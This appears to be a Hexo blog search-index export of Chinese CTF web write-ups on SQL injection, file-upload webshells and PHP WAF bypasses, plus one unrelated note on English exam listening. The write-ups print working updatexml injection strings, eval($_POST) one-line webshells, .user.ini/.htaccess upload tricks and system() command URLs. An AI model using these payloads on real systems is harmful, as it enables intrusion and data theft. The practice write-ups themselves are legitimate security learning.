<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HardSQL</title>
      <link href="/2023/11/26/HardSQL/"/>
      <url>/2023/11/26/HardSQL/</url>
      
        <content type="html"><![CDATA[<h1 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h1><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261010954.png" alt="image-20231126101043824"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and </span><br><span class="line">;show database()</span><br></pre></td></tr></table></figure><p>都显示这句话，代表应该被过滤了</p><p>但是不知道哪些被过滤了，所有要一个个跑，进行测试</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261016045.png" alt="image-20231126101647903"></p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261105524.png" alt="image-20231126110518432"></p><p>故这道题是单引号字符注入，没问题</p><p>有语法错误显示，那应该可以用报错注入</p><h2 id="过滤问题"><a href="#过滤问题" class="headerlink" title="过滤问题"></a>过滤问题</h2><p>因为这道题有过滤，但是不知道过滤了什么，所以可以用<font color="red">fuzz</font>进行测试</p><p>fuzz，fuzz其实就是一种对请求参数的模糊测试</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261252382.png" alt="image-20231126125256019"></p><p>利用fuzz进行过滤测试</p><p>发现长度为736的就是被过滤的</p><p>长度为751的就是没有过滤的，那么就可以用这些关键字真不错~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure><p>用括号子查询代替空格</p><blockquote><p>查出数据库</p></blockquote><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261305043.png" alt="image-20231126130512891"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geek</span><br></pre></td></tr></table></figure><blockquote><p>查表</p></blockquote><p>不行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e),1))</span><br></pre></td></tr></table></figure><p>行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))%2</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261317666.png" alt="image-20231126131700500"></p><p>行吧原来是&#x3D;也被过滤了👍</p><p>wp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261318230.png" alt="image-20231126131826181"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H4rDsq1</span><br></pre></td></tr></table></figure><p>出现</p><blockquote><p>查字段名</p></blockquote><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261326269.png" alt="image-20231126132638188"></p><p>我交的加结果。。。</p><p>wp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(column_name)from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>me：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))%2</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261330623.png" alt="image-20231126133018595"></p><p>服了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261330052.png" alt="image-20231126133044975"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password</span><br></pre></td></tr></table></figure><blockquote><p>查数据</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261334662.png" alt="image-20231126133445575"></p><p>出来一半因为这个默认显示32位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2c7883ce-9a07-41db-81</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid((select(group_concat(id,username,password))from(H4Dsq1)),31,64)</span><br></pre></td></tr></table></figure><p>me：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,((select(group_concat(id,username,password))from(H4Dsq1)),31,64),0x7e),1))#</span><br></pre></td></tr></table></figure><p>又显示被抓到了。。。</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261342061.png" alt="image-20231126134213947">行吧。。</p><p>wp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>故：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7883ce-9a07-41db-8190-9cdb2055f</span><br></pre></td></tr></table></figure><p>和之前的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2c7883ce-9a07-41db-81</span><br></pre></td></tr></table></figure><p>不够再往后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;or(updatexml(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b-8190-9cdb2055f0fa&#125;</span><br></pre></td></tr></table></figure><p>组成完整的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2c7883ce-9a07-41db-8190-9cdb2055f0fa&#125;</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311261346126.png" alt="image-20231126134607035"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>1： 通过fuzz测试该sql注入过滤了什么关键词</p><p>然后进行一步步绕过</p><p>2：在测试的时候发现该题有语法报错，所以通过xml进行注入</p><p>3：在现实flag的字段上出现显示不全的问题，那么通过right mid等函数进行一部分一部分的显示，达到最终拿到flag   </p><p>​right(str,len)</p><p>​返回最右侧的n个字符的字符串str</p>]]></content>
      
      
      <categories>
          
          <category> Web每日一题 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fakebook</title>
      <link href="/2023/11/22/Fakebook/"/>
      <url>/2023/11/22/Fakebook/</url>
      
        <content type="html"><![CDATA[<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311241628057.png" alt="image-20231124162841814"></p><p>先join进行注册</p><p>然后有url 进行测试</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311241631909.png" alt="image-20231124163143685"></p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311241632657.png" alt="image-20231124163223478"></p><p>当输入5的时候出现</p><p>4没有，故 列数为4</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311241633626.png" alt="image-20231124163329565"></p><p>是数字型的</p><p>出现no hack 应该是进行过滤了</p><p>1：用内联注释进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union /*!select*/ 1,2,3,4#</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311241706177.png" alt="image-20231124170651670"></p><p>2：采用union all select 进行绕过</p><p>可以进行绕过</p><p>因为是sql注入</p><p>还是直接用sqlmap跑</p>]]></content>
      
      
      <categories>
          
          <category> Web每日一题 </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CheckIn</title>
      <link href="/2023/11/21/%5BSUCTF-2019%5DCheckIn/"/>
      <url>/2023/11/21/%5BSUCTF-2019%5DCheckIn/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h3 id><a href="#" class="headerlink" title></a><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212051699.png" alt="image-20231121205124552"></h3><p>很明显文件上传＋马的问题</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212052411.png" alt="image-20231121205225267"></p><p>cmd.jpg 上传成功发现里面有2个文件一个是刚刚的jpg</p><p>一个是index.php</p><p>文件上传的路径为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploads/c55e0cb61f7eb238df09ae30a206e5ee </span><br></pre></td></tr></table></figure><p>抓包把文件路径修改为php3，php5，phtml都不行</p><p>显示</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212057205.png" alt="image-20231121205721970"></p><p>而这道题没有采用<font color="red">文件重命名的方式</font></p><p>那么可以上传配置文件看一下</p><p>&#x3D;&#x3D;.user.ini&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=postcmd.jpg</span><br></pre></td></tr></table></figure><p>这个配置文件是在目录下的所有php文件加入shell.jpg文件里面的内容</p><p>所以可以把它当成刚刚的file_content那个函数</p><p>通过前天的题目知道文件上传的马最好用post请求参数这样可以连到蚂蚁上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么get不行 现在还不知道</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212101285.png" alt="image-20231121210139147"></p><p>传入成功</p><p>进行php文件测试 看是否我们的马进去了</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212117803.png" alt="image-20231121211740308"></p><p>上传成功 蚂蚁连接</p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212118900.png" alt="image-20231121211803634"></p><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212118945.png" alt="image-20231121211844531"></p><p>得到flag</p><h3 id="summary："><a href="#summary：" class="headerlink" title="summary："></a>summary：</h3><p>1：命名不要错，我的postcmd之前多加了一个空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postcmd .jpg</span><br></pre></td></tr></table></figure><p>而ini文件里又是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postcmd.jpg</span><br></pre></td></tr></table></figure><p>导致后期一致连不上蚂蚁</p><p>2：还是post传参吧</p><p>步骤</p><p>1：先抓包改后缀</p><p>2：如果文件有被重命名，那么ini和hta感觉就用不上了</p><p>3：注意上传文件的路径，当前的路径不是上传的路径</p><p>所以你蚂蚁连接时的路径要注意</p>]]></content>
      
      
      <categories>
          
          <category> Web每日一题 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>六级备考之听力</title>
      <link href="/2023/11/21/%E5%85%AD%E7%BA%A7%E5%A4%87%E8%80%83%E4%B9%8B%E5%90%AC%E5%8A%9B/"/>
      <url>/2023/11/21/%E5%85%AD%E7%BA%A7%E5%A4%87%E8%80%83%E4%B9%8B%E5%90%AC%E5%8A%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="六级备考之听力"><a href="#六级备考之听力" class="headerlink" title="六级备考之听力"></a>六级备考之听力</h1><p>长对话</p><p>新闻报道</p><h3 id="视听一致"><a href="#视听一致" class="headerlink" title="视听一致"></a>视听一致</h3><p>关键信息与音频内容完全相等</p><p>关键信息出现次数最多</p><h3 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h3><p>选项都一样的关键词不用画</p><p>画实不画虚</p><p>画否定词</p><h3 id="同转"><a href="#同转" class="headerlink" title="同转"></a>同转</h3><h3 id="正确及错误选项特点"><a href="#正确及错误选项特点" class="headerlink" title="正确及错误选项特点"></a>正确及错误选项特点</h3>]]></content>
      
      
      <categories>
          
          <category> 六级 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 听力 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload</title>
      <link href="/2023/11/20/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DUpload/"/>
      <url>/2023/11/20/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DUpload/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”,”.ini</p><p> php <a href="https://so.csdn.net/so/search?q=%E6%9C%8D%E5%8A%A1%E5%99%A8&spm=1001.2101.3001.7020">服务器</a>可以把其他后缀的文件解析后可作为代码运行。</p><p>1：白名单</p><p><img src="https://s2.loli.net/2023/11/20/RjxrCGIcMky7HpZ.png" alt="image-20231120234113706"></p><p>试了一下上传jpg和配置文件htacess</p><p>任何发现jpg文件可以上传，所以知道它是白名单的文件上传</p><p><img src="https://s2.loli.net/2023/11/20/Sw92FsV3ZzOlApR.png" alt="image-20231120235158579"></p><p><img src="https://s2.loli.net/2023/11/21/6J78PWq3Ncafn1y.png" alt="image-20231121001103592"></p><p>发现只是前端的检查</p><p>可以上传htacess</p><p>所以会把所有的文件当成php来执行</p><p><img src="https://s2.loli.net/2023/11/21/RlAZUwvHLGdimjk.png" alt="image-20231121001220333"></p><p>马上传成功</p><p><img src="https://s2.loli.net/2023/11/21/9wLu4zVoO2g8MX5.png" alt="image-20231121001547863"></p><p>不知道为什么上传了hta上传了马还是不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为那个配置文件命名确定只能.htacess那种 前面不能加东西</span><br></pre></td></tr></table></figure><p>2：重命名</p><p><img src="https://s2.loli.net/2023/11/20/SpJ4O8KytcG5N9s.png" alt="image-20231120235416629"></p><p><img src="https://s2.loli.net/2023/11/21/oLUSzGRQa68eNMX.png" alt="image-20231121000052563"></p><p>上传成功了但是测试phpinfo（）没有显示诶</p><p>试一下蚂蚁，也不行</p><p>看了题解，发现php不行测试php2，php5，phtml</p><p><img src="https://s2.loli.net/2023/11/21/dqgv31FeGUaYOPl.png" alt="image-20231121001822042"></p><p>虽然不知道为什么这个就行。。。</p><p><img src="https://s2.loli.net/2023/11/21/74K59WJTVE1HFCO.png" alt="image-20231121002141445"></p><p><img src="https://s2.loli.net/2023/11/21/yzp79isLI5XMtGn.png" alt="image-20231121002410316"></p><p>蚁剑只能连post 好吧记住了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://695a04c4-39f0-4f52-a475-d626b6c910c7.node4.buuoj.cn:81/uplo4d/eec4cd34266a99b471a4ebe1c5cb5488.phtml?cmd=system(%27ls%20/%27);</span><br></pre></td></tr></table></figure><p>找根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br></pre></td></tr></table></figure><p>找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=system(%27cat%20/flag%27);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d9571b24-da91-430a-bc77-307854476081&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web每日一题 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>write_shell</title>
      <link href="/2023/11/19/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5Dwrite_shell/"/>
      <url>/2023/11/19/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021%5Dwrite_shell/</url>
      
        <content type="html"><![CDATA[<h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><p>进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果input存在这些关键之则关闭程序</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果input是一个数据 则把</p><p><code>foreach($input as $key=&gt;$output)&#123;&#125;</code> 是一个循环，遍历数组 <code>$input</code>。在每次循环中，它会取出数组中的一个元素（作为 <code>$output</code>），并且将该元素的键名存储在变量 <code>$key</code> 中。</p><p>这行代码将 <code>waf()</code> 函数应用于 <code>$output</code>，然后将结果存回原数组 <code>$input</code> 的相应位置。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果文件存在dir变量 则查询这个地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将接收到的参数进行判断</p><p>如果action参数等于pwd 那么直接输出index.php的路径,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/c55e0cb61f7eb238df09ae30a206e5ee/</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311211345198.png" alt="image-20231121134546048"></p><p>一开始进行访问的时候显示index文件没有，因为data参数还没有传进去，<font color="red">所以这个文件还没有被创建</font></p><p>如果action参数等于upload  那么它会从data中get参数</p><p>接着使用 <code>file_put_contents()</code> 函数将 <code>$data</code> 的内容写入到 <code>$dir</code> 目录下的 <code>index.php</code> 文件中。</p><p>所以就是你data内容会写到路径下的index.php里面，而不是当前的文件</p><p><img src="https://s2.loli.net/2023/11/19/DuqKyHZQseh5vfI.png" alt="image-20231119002857328"></p><p>初步思路就是在data传入一句话木马到index.php</p><p>一般正常来说的木马<font color="red"></font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/11/19/6B7PKR1JrSDj2pV.png" alt="image-20231119195927193"></p><p>因为preg_match 把php过滤了，所以要进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">具体来说，这个正则表达式匹配的是：</span><br><span class="line"></span><br><span class="line">单引号 &#x27;</span><br><span class="line">空格</span><br><span class="line">下划线 _</span><br><span class="line">单词 php（不区分大小写，因为正则表达式中包含了 /i 标记，表示不区分大小写）</span><br><span class="line">分号 ;</span><br><span class="line">波浪号 ~</span><br><span class="line">脱字符 \</span><br><span class="line">加号 +</span><br><span class="line">eval 函数（在 PHP 中，eval 函数可以执行字符串中的 PHP 代码，这是一个非常危险的操作）</span><br><span class="line">大括号 &#123;</span><br></pre></td></tr></table></figure><p>可以用短标签进行绕过</p><p>这2个短标签默认不支持要进行配置文件的修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?? &gt;</span><br><span class="line"></span><br><span class="line">&lt;% %&gt;</span><br></pre></td></tr></table></figure><p>但是这个短标签是支持的</p><p>查询当前目录应该是ls+空格</p><p>但是空格被过滤了</p><p>所以%09</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`ls%09/`?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>反引号和shell_exec()作用相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311211345938.png" alt="image-20231121134533714"></p><p>为啥我不行啊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=`ls%09sandbox/c55e0cb61f7eb238df09ae30a206e5ee/`?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox/c55e0cb61f7eb238df09ae30a206e5ee/</span><br></pre></td></tr></table></figure><p>wq！要把当前目录加上</p><p><img src="https://s2.loli.net/2023/11/19/n5siKgIM2mSL9Xl.png" alt="image-20231119203933810"></p><p><img src="https://s2.loli.net/2023/11/19/RfT2gw56hVk8Aod.png" alt="image-20231119204317175"></p><p><img src="https://s2.loli.net/2023/11/19/MdzNAI6GQxh2LiW.png" alt="image-20231119204444747"></p><p><img src="https://s2.loli.net/2023/11/19/8OfaYsitELjGquU.png" alt="image-20231119204935681"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&lt;?=&#x27;cat%09/flag&#x27;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://jd-typora-pictures.oss-cn-beijing.aliyuncs.com/img/202311212047832.png" alt="image-20231121204750464"></p><p>插入后查询该目录</p><p>发现flag</p>]]></content>
      
      
      <categories>
          
          <category> Web每日一题 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
